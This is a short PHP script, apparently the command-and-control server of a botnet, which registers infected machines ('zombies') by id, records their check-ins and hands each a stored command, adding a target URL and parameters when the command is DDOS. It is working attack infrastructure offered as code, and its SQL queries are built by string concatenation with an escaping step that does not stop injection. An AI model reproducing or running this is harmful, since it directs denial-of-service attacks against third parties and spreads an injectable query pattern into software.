<?php
include_once('config.php');

$zombieID = isset($_GET['id'])?$_GET['id']:'';
if(!empty($zombieID)) {
	
	include_once('setup_db_conn.php');
	
	
	
	// Bot bereits registriert?
	$query = 'SELECT * FROM zombies WHERE id="'.htmlentities($zombieID).'";';
	$result = mysqli_query($link,$query);
	if($result && mysqli_num_rows($result)>0) {
		$row = mysqli_fetch_assoc($result);
		echo $row["command"];
		if($row["command"] == "DDOS") {
			echo " http://www.yolocaust.de/tentob/ 3 1";
		}
		mysqli_free_result($result);
		// Bot bekannt
		$query = 'UPDATE zombies SET last_connect=NOW() WHERE id="'.htmlentities($zombieID).'";';
	} else {
		// neuer Bot
		$query = 'INSERT INTO zombies (id) VALUES ("'.htmlentities($zombieID).'");';
		echo "New Zombie inserted: ".$query;
	}
	mysqli_query($link,$query);	
	mysqli_close($link);
	
	//echo getenv("HTTP_X_FORWARDED_FOR")?getenv("HTTP_X_FORWARDED_FOR").'<br>':'';
	//echo getenv("REMOTE_ADDR");
	
} else {
	header("Location: /404.html");
}
?>